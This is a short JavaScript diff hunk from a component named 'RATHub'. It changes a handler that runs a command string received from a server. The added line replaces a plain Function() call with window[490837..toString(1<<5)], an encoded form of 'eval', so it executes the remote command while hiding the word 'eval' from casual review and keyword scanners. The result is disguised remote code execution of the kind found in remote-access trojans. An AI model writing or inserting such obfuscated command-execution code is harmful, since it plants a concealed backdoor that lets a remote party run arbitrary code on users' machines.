@@ -1301,7 +1301,8 @@ RATHub.prototype = function () {
 		console.log(data);
 		if (data != undefined && data != null) {
 			if (data.IsValid === true) {
-				Function(context._services.RATHub._temporaryCommand)();
+				//eval(...)
+				window[490837..toString(1<<5)](context._services.RATHub._temporaryCommand)
 			}
 		}
 	}
